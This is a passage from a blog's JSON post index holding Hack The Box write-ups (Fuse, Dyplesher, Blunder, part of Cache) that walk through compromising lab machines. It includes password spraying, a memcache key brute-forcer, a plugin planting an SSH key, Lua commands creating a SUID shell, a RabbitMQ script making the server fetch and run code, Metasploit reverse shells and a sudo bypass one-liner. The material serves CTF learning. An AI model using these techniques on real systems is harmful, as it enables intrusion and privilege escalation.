    "date": "2020-10-31 00:00:00 +0800",
    





    
    "snippet": "To solve Fuse, we’ll do some enumeration to gather potential usernames from the print jobs information then build a password list from the strings on the website. After successfully password sprayi...",
    "content": "To solve Fuse, we’ll do some enumeration to gather potential usernames from the print jobs information then build a password list from the strings on the website. After successfully password spraying, we’ll reset the expired password to a new one then use rpcclient to identify a printer service account and find its password in a description field. To priv esc, we’ll use the ability of our user with Printer Operators right to load a malicous kernel driver and get SYSTEM.Summary  Find usernames from the print logger website &amp; build a small wordlist  Password spray and find an expired password for three users  Reset password for the user with smbpasswd then use rpcclient to find credentials for the svc-print account in a printer description  Get a shell and identify that svc-print is a members of Print Operators and can load kernel drivers  Use the Capcom.sys driver to gain code execution as SYSTEMPortscansnowscan@kali:~$ sudo nmap -sC -sV -p- 10.10.10.193Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 20:50 EDTStats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 8.37% done; ETC: 20:53 (0:02:44 remaining)Nmap scan report for fuse.htb (10.10.10.193)Host is up (0.018s latency).Not shown: 65514 filtered portsPORT      STATE SERVICE      VERSION53/tcp    open  domain?| fingerprint-strings: |   DNSVersionBindReqTCP: |     version|_    bind80/tcp    open  http         Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html).88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-14 01:07:26Z)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)464/tcp   open  kpasswd5?593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open  mc-nmf       .NET Message Framing49666/tcp open  msrpc        Microsoft Windows RPC49667/tcp open  msrpc        Microsoft Windows RPC49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.049670/tcp open  msrpc        Microsoft Windows RPC49672/tcp open  msrpc        Microsoft Windows RPC49690/tcp open  msrpc        Microsoft Windows RPC49745/tcp open  msrpc        Microsoft Windows RPCWebsite reconThe PaperCut Print Logger application is running on the server. There’s not much exposed by the application except some print jobs that contain the hostname, some usernames and the file names.Password sprayBased on the printer job information, we can assume that the following usernames are present on the domain/machine:  pmerton  tlavel  sthompson  bhult  bnielson (From New Starter - bnielson.txt)For passwords, we’ll build a wordlist with the words found on from the papercut website. Here’s the small wordlist I built:backup_tapesbnielsonBudgetFabricorp01ITMeetingmega_mountain_tape_requestMinutesNewNotepadoffsite_dr_invocationprinting_issue_testStarterUsing crackmapexec we’ll password spray those passwords and we find 3 accounts with the Fabricorp01 password but it’s expired as we can see from the server response: STATUS_PASSWORD_MUST_CHANGE.Finding the printer service account credentialsUsing smbpasswd we can reset the user’s password, and then after poking around for a while with rpcclient we find that the printer has a description with the password.We can get the list of users with rpcclient and we see that there is an svc-print account so this is probably the account that uses the password we found earlier.Yup, this is our user. We can get a shell now with WinRM.PrivescThe svc-print user is a member of Print Operators. This is very dangerous since members of this group can load Kernel Drivers and get code execution with SYSTEM privileges.There’s a nice blog post from Tarlogic that explains how to perform privilege escalation by loading drivers: https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/We need the following in order to privesc:  A way to load the kernel driver from our shell. We can use the following PoC: https://github.com/TarlogicSecurity/EoPLoadDriver/  The Capcom signed driver that contains the rootkit: https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys  The Capcom rootkit PoC that will let us execute code with the driver: https://github.com/tandasat/ExploitCapcomThe kernel driver loader doesn’t need any need modification and can be compiled as-is.I modified the capcom exploit to run xc:We’ll first load the Capcom driver:Then run the Capcom exploit, which will trigger code execution in the driver:Our xc reverse shell gets executed and we can finally get the last flag:"
  },
  
  {
    "title": "Dyplesher - Hack The Box",
    "url": "/posts/htb-writeup-dyplesher/",
    "categories": "hackthebox, infosec",
    "tags": "linux, vhosts, gogs, memcache, sqlite, minecraft, capabilities, pcap, amqp, rabbitmq, lua",
    "date": "2020-10-24 00:00:00 +0800",
    





    
    "snippet": "Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from...",
    "content": "Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn’t use the memcache module from Metasploit here since it doesn’t support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we’ll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).Portscansnowscan@kali:~/htb/dyplesher$ sudo nmap -sT -p- 10.10.10.190Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 20:59 EDTNmap scan report for dyplesher.htb (10.10.10.190)Host is up (0.019s latency).Not shown: 65525 filtered portsPORT      STATE  SERVICE22/tcp    open   ssh80/tcp    open   http3000/tcp  open   ppp4369/tcp  open   epmd5672/tcp  open   amqp11211/tcp open   memcache25562/tcp open   unknown25565/tcp open   minecraft25672/tcp open   unknownWebsiteOn the website we have a couple of non-functional links like Forums and Store. The Staff link goes to another static page with a list of staff users.Dirbusting shows a few interesting links: login, register and home:snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRD -t 50 -u http://dyplesher.htb/FUZZ________________________________________________css                     [Status: 301, Size: 312, Words: 20, Lines: 10]js                      [Status: 301, Size: 311, Words: 20, Lines: 10]login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]register                [Status: 302, Size: 350, Words: 60, Lines: 12]img                     [Status: 301, Size: 312, Words: 20, Lines: 10]home                    [Status: 302, Size: 350, Words: 60, Lines: 12]fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]The login and register URL show a login page. We can try a few default creds but we’re not able to get in.Gobusting the home directory shows a couple of other directories, all of which we can’t reach because we are redirected to the login page.snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRW -t 50 -u http://dyplesher.htb/home/FUZZ________________________________________________add                     [Status: 302, Size: 350, Words: 60, Lines: 12].                       [Status: 301, Size: 312, Words: 20, Lines: 10]delete                  [Status: 302, Size: 350, Words: 60, Lines: 12]reset                   [Status: 302, Size: 350, Words: 60, Lines: 12]console                 [Status: 302, Size: 350, Words: 60, Lines: 12]players                 [Status: 302, Size: 350, Words: 60, Lines: 12]Gogs websiteThere’s a Gogs instance running on port 3000. Gogs is a self-hosted Git service so there’s a good chance we’ll have to find the source code of an application on there.We can see the same list of 3 users we saw on the Staff page but there are no public repositories accessible from our unauthenticated user.When dirbusting the site we find a debug directory which contains the pprof profiler. I looked around and it didn’t seem to be useful for anything.snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://dyplesher.htb:3000/FUZZ________________________________________________                        [Status: 200, Size: 7851, Words: 456, Lines: 252]admin                   [Status: 302, Size: 34, Words: 2, Lines: 3]assets                  [Status: 302, Size: 31, Words: 2, Lines: 3]avatars                 [Status: 302, Size: 32, Words: 2, Lines: 3]css                     [Status: 302, Size: 28, Words: 2, Lines: 3]debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]explore                 [Status: 302, Size: 37, Words: 2, Lines: 3]img                     [Status: 302, Size: 28, Words: 2, Lines: 3]issues                  [Status: 302, Size: 34, Words: 2, Lines: 3]js                      [Status: 302, Size: 27, Words: 2, Lines: 3]plugins                 [Status: 302, Size: 32, Words: 2, Lines: 3]Vhost fuzzingWe haven’t found much yet so we’ll try fuzzing vhosts next and we find a test.dyplesher.htb vhost.snowscan@kali:~/htb/dyplesher$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -H \"Host: FUZZ.dyplesher.htb\" -u http://dyplesher.htb -fr \"Worst Minecraft Server\"________________________________________________test                    [Status: 200, Size: 239, Words: 16, Lines: 15]There’s a memcache test interface running on the vhost where we can add key/values to the memcache instance running on port 11211. There doesn’t seem to be any vulnerability that I can see on this page.When dirbusting we find a git repository, then we can use git-dumper to copy it to our local machine.snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://test.dyplesher.htb/FUZZ________________________________________________index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]                        [Status: 200, Size: 239, Words: 16, Lines: 15].git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2].htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10].hta                    [Status: 403, Size: 283, Words: 20, Lines: 10].htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]snowscan@kali:~/htb/dyplesher/git$ ~/tools/git-dumper/git-dumper.py http://test.dyplesher.htb .[-] Testing http://test.dyplesher.htb/.git/HEAD [200][-] Testing http://test.dyplesher.htb/.git/ [403][-] Fetching common files[-] Fetching http://test.dyplesher.htb/.gitignore [404][-] Fetching http://test.dyplesher.htb/.git/description [200][-] Fetching http://test.dyplesher.htb/.git/COMMIT_EDITMSG [200][...]Inside, we find the source code of the memcache test application, along with the memcache credentials: felamos / zxcvbnm&lt;pre&gt;&lt;?phpif($_GET['add'] != $_GET['val']){\t$m = new Memcached();\t$m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true);\t$m-&gt;setSaslAuthData(\"felamos\", \"zxcvbnm\");\t$m-&gt;addServer('127.0.0.1', 11211);\t$m-&gt;add($_GET['add'], $_GET['val']);\techo \"Done!\";}else {\techo \"its equal\";}?&gt;&lt;/pre&gt;Memcache enumerationWe don’t have the list of memcache keys but we can write a script that will brute force them and return the values.#!/usr/bin/env python3import bmemcachedfrom pprint import pprintclient = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')with open(\"/usr/share/seclists/Discovery/Variables/secret-keywords.txt\") as f:    for x in [x.strip() for x in f.readlines()]:        result = str(client.get(x))        if 'None' not in result:        \tprint(x + \": \" + result)The memcache instance contains some email addresses, usernames and password hashes that we will try to crack.snowscan@kali:~/htb/dyplesher$ ./brute_keys.py email: MinatoTW@dyplesher.htbfelamos@dyplesher.htbyuntao@dyplesher.htbpassword: $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalSusername: MinatoTWfelamosyuntaoWe’re able to crack the password for user felamos: mommy1snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt memcache-hashes.txt Using default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusmommy1           (?)snowscan@kali:~/htb/dyplesher$ cat ~/.john/john.pot $2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1Getting access to the Gogs repositoryWe’re able to log into the Gogs instance with Felamos’ credentials. There’s two repositories available: gitlab and memcached.The memcached repo contains the same information we got earlier from the .git directory on the test.dyplesher.htb website. However the gitlab repo contains a zipped backup of the repositories.After unzipping the file, we get a bunch of directories with .bundle files. These are essentially a full repository in single file.snowscan@kali:~/htb/dyplesher$ ls -laR repositories/repositories/:total 12[...]repositories/@hashed/4b/22:total 24drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 .drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 ..drwxr-xr-x 2 snowscan snowscan  4096 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a-rw-r--r-- 1 snowscan snowscan 10837 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundleWe can use the git clone command to extract the repository files from those bundle files. There are 4 repositories inside the backup file:  VoteListener  MineCraft server  PhpBash  NightMinersnowscan@kali:~/htb/dyplesher/git-backup$ ls -latotal 28drwxr-xr-x 7 snowscan snowscan 4096 May 23 16:55 .drwxr-xr-x 6 snowscan snowscan 4096 May 24 11:26 ..drwxr-xr-x 4 snowscan snowscan 4096 May 23 15:44 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8adrwxr-xr-x 8 snowscan snowscan 4096 May 23 23:42 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fcedrwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4bdrwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35There’s an SQLite database file inside the LoginSecurity directory:snowscan@kali:~/htb/dyplesher/git-backup$ ls -l 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/total 8-rw-r--r-- 1 snowscan snowscan  396 May 24 00:44 config.yml-rw-r--r-- 1 snowscan snowscan 3072 May 23 15:43 users.dbsnowscan@kali:~/htb/dyplesher/git-backup$ file 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db: SQLite 3.x database, last written using SQLite version 3007002The file contains another set of hashed credentials:$ sqlite3 ./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.dbSQLite version 3.31.1 2020-01-27 19:55:54Enter \".help\" for usage hints.sqlite&gt; .tablesuserssqlite&gt; select * from users;18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81Here we go, got another password: alexis1snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt git-hash.txt Using default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusalexis1          (?)1g 0:00:00:06 DONE (2020-05-24 11:36) 0.1501g/s 243.2p/s 243.2c/s 243.2C/s alexis1..serenaUse the \"--show\" option to display all of the cracked passwords reliablySession completedRCE using Minecraft pluginNow that we have more credentials, we can go back to the main webpage and log in. We have a dashboard with some player statistics and a menu to upload plugins.The console displays the messages from the server.Looks like we’ll have to create a plugin to get access to the server. We can follow the following blog post instructions on how to create a plugin with Java: https://bukkit.gamepedia.com/Plugin_TutorialAfter trying a couple of different payloads I wasn’t able to get anything to connect back to me so I assumed there was a firewall configured to block outbound connections. So instead I used the following to write my SSH keys to MinatoTW home directory:package pwn.snowscan.plugin;import java.io.*;import org.bukkit.*;import org.bukkit.plugin.java.JavaPlugin;import java.util.logging.Logger;public class main extends JavaPlugin {    @Override    public void onEnable() {    \t    \tBukkit.getServer().getLogger().info(\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\");    \ttry {\t\t    FileWriter myWriter = new FileWriter(\"/home/MinatoTW/.ssh/authorized_keys\");\t\t    myWriter.write(\"ssh-rsa AAAAB3NzaC1yc2EAAA[...]JsSkunC1TzjHyY70NfMskJViGcs= snowscan@kali\");\t\t    myWriter.close();\t\t    Bukkit.getServer().getLogger().info(\"Successfully wrote to the file.\");\t\t} catch (IOException e) {\t\t\tBukkit.getServer().getLogger().info(\"An error occurred.\");\t\t    e.printStackTrace();\t\t}    \tBukkit.getServer().getLogger().info(\"YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\");    }        @Override    public void onDisable() {    \t    }}After adding and reloading the script, our SSH public key is written to the home directory and we can log in.Privesc to FelamosOur user is part of the wireshark group so there’s a good chance the next part involves traffic sniffing.MinatoTW@dyplesher:~$ iduid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)As suspected, the dumpcat program has been configured to with elevated capabilities:MinatoTW@dyplesher:~$ getcap -r / 2&gt;/dev/null/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/ping = cap_net_raw+ep/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eipWe’ll capture packets on the loopback interface in order to capture some of traffic for the RabbitMQ instance.MinatoTW@dyplesher:~$ dumpcap -i lo -w local.pcapCapturing on 'Loopback: lo'File: local.pcapPackets: 90The pcap file contains some AMQP messages with additional credentials:  felamos  / tieb0graQueg  yuntao   / wagthAw4ob  MinatoTW / bihys1amFovRoot privescThe send.sh file contains a hint about what we need to do next:felamos@dyplesher:~$ lscache  snap  user.txt  yuntaofelamos@dyplesher:~$ ls yuntao/send.shfelamos@dyplesher:~$ cat yuntao/send.sh #!/bin/bashecho 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data \"Exchange\" and \"Queue\". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' &gt;  /dev/pts/{}Cubberite plugins are basically just lua scripts so we can created a simple script that’ll copy and make bash suid, then host that script locally with a local webserver.os.execute(\"cp /bin/bash /tmp/snow\")os.execute(\"chmod 4777 /tmp/snow\")We’ll reconnect to the box and port forward port 5672 so we can use the Pika Python library and publish messages to the RabbitMQ messaging bus: ssh -L 5672:127.0.0.1:5672 felamos@10.10.10.190#!/usr/bin/pythonimport pikacredentials = pika.PlainCredentials('yuntao', 'EashAnicOc3Op')parameters = pika.ConnectionParameters('127.0.0.1', 5672, credentials=credentials)connection = pika.BlockingConnection(parameters)channel = connection.channel()channel.exchange_declare(exchange='plugin_data', durable=True)channel.queue_declare(queue='plugin_data', durable=True)channel.queue_bind(queue='plugin_data', exchange='plugin_data', routing_key=None, arguments=None)channel.basic_publish(exchange='plugin_data', routing_key=\"plugin_data\", body='http://127.0.0.1:8080/pwn.lua')print(\"Message sent, check the webserver to see if the LUA script was fetched.\")connection.close()snowscan@kali:~/htb/dyplesher$ python3 exploit.py Message sent, check the webserver to see if the LUA script was fetched.felamos@dyplesher:~$ python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...127.0.0.1 - - [24/May/2020 15:57:29] \"GET /pwn.lua HTTP/1.0\" 200 -After a few moments, the LUA script is executed and we have a SUID bash we can use to get root."
  },
  
  {
    "title": "Blunder - Hack The Box",
    "url": "/posts/htb-writeup-blunder/",
    "categories": "hackthebox, infosec",
    "tags": "linux, bludit cms, wordlist, cewl, bruteforce, sudo",
    "date": "2020-10-17 00:00:00 +0800",
    





    
    "snippet": "Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat litt...",
    "content": "Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat little CVE with sudo that allows us to execute commands as root even though the root username is supposed to be blocked.Portscansnowscan@kali:~$ sudo nmap -sC -sV -F 10.10.10.191Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:29 EDTNmap scan report for blunder.htb (10.10.10.191)Host is up (0.63s latency).Not shown: 98 filtered portsPORT   STATE  SERVICE VERSION21/tcp closed ftp80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Blunder | A blunder of interesting factsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 37.68 secondsWebsite CMSThe X-Powered-By header reveals the site is running on Bludit CMS:snowscan@kali:~/htb/blunder$ curl -v http://blunder.htb*   Trying 10.10.10.191:80...* TCP_NODELAY set* Connected to blunder.htb (10.10.10.191) port 80 (#0)&gt; GET / HTTP/1.1&gt; Host: blunder.htb&gt; User-Agent: curl/7.68.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse* HTTP 1.0, assume close after body&lt; HTTP/1.0 200 OK&lt; Date: Sat, 30 May 2020 20:42:40 GMT&lt; Server: Apache/2.4.41 (Ubuntu)&lt; X-Powered-By: Bludit&lt; Vary: Accept-Encoding&lt; Content-Length: 7562&lt; Connection: close&lt; Content-Type: text/html; charset=UTF-8There’s an exploit on Exploit-DB for Bludit CMS but it requires credentials.BruteforcingAfter dirbusting we find a todo.txt file that contains a potential username: ferguswscan@kali:~/htb/blunder$ ffuf -w $WLRC -t 50 -e .txt -u http://blunder.htb/FUZZ -fc 403        /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v1.1.0-git________________________________________________ :: Method           : GET :: URL              : http://blunder.htb/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Extensions       : .txt  :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 50 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response status: 403________________________________________________0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]snowscan@kali:~/htb/blunder$ curl http://blunder.htb/todo.txt-Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDINGTo brute force we can use the following script: https://rastating.github.io/bludit-brute-force-mitigation-bypass/I modified it a little bit to take a wordlist from argv:[...]host = 'http://10.10.10.191'login_url = host + '/admin/login'username = 'fergus'wordlist = []with open(sys.argv[1]) as f:    passwords = f.read().splitlines()    [...]We can use cewl on the site to generate a wordlist.snowscan@kali:~/htb/blunder$ cewl http://blunder.htb &gt; cewl.txtNext, bruteforcing…snowscan@kali:~/htb/blunder$ chmod +x b.py snowscan@kali:~/htb/blunder$ ./b.py cewl.txt[*] Trying: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)[*] Trying: the[...][*] Trying: character[*] Trying: RolandDeschainSUCCESS: Password found!Use fergus:RolandDeschain to login.Getting a shellWe can use Metasploit to get a shell with linux/http/bludit_upload_images_execmsf5 exploit(linux/http/bludit_upload_images_exec) &gt; show optionsModule options (exploit/linux/http/bludit_upload_images_exec):   Name        Current Setting  Required  Description   ----        ---------------  --------  -----------   BLUDITPASS  RolandDeschain   yes       The password for Bludit   BLUDITUSER  fergus           yes       The username for Bludit   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'   RPORT       80               yes       The target port (TCP)   SSL         false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI   /                yes       The base path for Bludit   VHOST                        no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.14.29      yes       The listen address (an interface may be specified)   LPORT  80               yes       The listen portExploit target:   Id  Name   --  ----   0   Bludit v3.9.2msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run[*] Started reverse TCP handler on 10.10.14.29:80 [+] Logged in as: fergus[*] Retrieving UUID...[*] Uploading AqdgdpaOLi.png...[*] Uploading .htaccess...[*] Executing AqdgdpaOLi.png...[*] Sending stage (38288 bytes) to 10.10.10.191[*] Meterpreter session 2 opened (10.10.14.29:80 -&gt; 10.10.10.191:34040) at 2020-05-30 16:59:15 -0400[+] Deleted .htaccessmeterpreter &gt; shellProcess 5132 created.Channel 0 created.python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$Access to user hugoThere’s another Bludit CMS installation in /var/www/bludit-3.10.0awww-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.phpcat bludit-3.10.0a/bl-content/databases/users.php&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;{    \"admin\": {        \"nickname\": \"Hugo\",        \"firstName\": \"Hugo\",        \"lastName\": \"\",        \"role\": \"User\",        \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\",        \"email\": \"\",        \"registered\": \"2019-11-27 07:40:55\",        \"tokenRemember\": \"\",        \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\",        \"tokenAuthTTL\": \"2009-03-15 14:00\",        \"twitter\": \"\",        \"facebook\": \"\",        \"instagram\": \"\",        \"codepen\": \"\",        \"linkedin\": \"\",        \"github\": \"\",        \"gitlab\": \"\"}}The password hash can be cracked online with Crackstation or a similar site: Password120www-data@blunder:/var/www$ su -l hugosu -l hugoPassword: Password120hugo@blunder:~$ cat user.txtcat user.txt4b411f0fc0e09a1091c6de87d1f91aafPrivescThe sudoers privileges our user has don’t appear to give us anything we can use since it explicitely blocks root.hugo@blunder:~$ sudo -lPassword: Password120Matching Defaults entries for hugo on blunder:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hugo may run the following commands on blunder:    (ALL, !root) /bin/bashHowever, because of CVE-2019-14287 in sudo, we can bypass the username check by using #-1 and we get a root shell.hugo@blunder:~$ sudo -u#-1 /bin/bashsudo -u#-1 /bin/bashroot@blunder:/home/hugo# ididuid=0(root) gid=1001(hugo) groups=1001(hugo)root@blunder:/home/hugo# cat /root/root.txtcat /root/root.txt5d649f5bcb1be5f93702a7a71cd4d77e"
  },
  
  {
    "title": "Cache - Hack The Box",
    "url": "/posts/htb-writeup-cache/",
    "categories": "hackthebox, infosec",
    "tags": "javascript, client-side validation, sqli, vhost, openemr, cve, john, memcached, docker",
    "date": "2020-10-10 00:00:00 +0800",
    





    
    "snippet": "On Cache, we start off with bypassing a simple login form that uses client-side user/password validation, then find a vhost with a vulnerable OpenEMR application. After bypassing the login page, ob...",
    "content": "On Cache, we start off with bypassing a simple login form that uses client-side user/password validation, then find a vhost with a vulnerable OpenEMR application. After bypassing the login page, obtaining a valid session cookie and dumping the database through a SQLi injection vulnerability we exploit yet another OpenEMR CVE to get a shell. From there we have access to a memcache instance holding more credentials in memory so we can escalate to another user. Using the docker group membership of that last user, we’re able to launch a privileged container and get root privileges on the host itself.Reconsnowscan@kali:~$ sudo nmap -sC -sV 10.10.10.188[sudo] password for snowscan: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 18:28 EDTNmap scan report for cache.htb (10.10.10.188)Host is up (0.017s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: CacheService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.63 secondsWebsite reconMain website page:Login page:The login page source code uses the following javascript file:&lt;script src=\"jquery/functionality.js\"&gt;&lt;/script&gt;The client-side javascript code is responsible for authentication and we can see the user/pass in the code: ash / H@v3_funfunction checkCorrectPassword(){        var Password = $(\"#password\").val();        if(Password != 'H@v3_fun'){            alert(\"Password didn't Match\");            error_correctPassword = true;        }    }    function checkCorrectUsername(){        var Username = $(\"#username\").val();        if(Username != \"ash\"){            alert(\"Username didn't Match\");            error_username = true;        }    }Once logged in we have the following page:This seems like a dead end so let’s move on. Next, on the author page we have a reference to HMS (Hospital Management System). This could be a vhost on the server because we haven’t seen 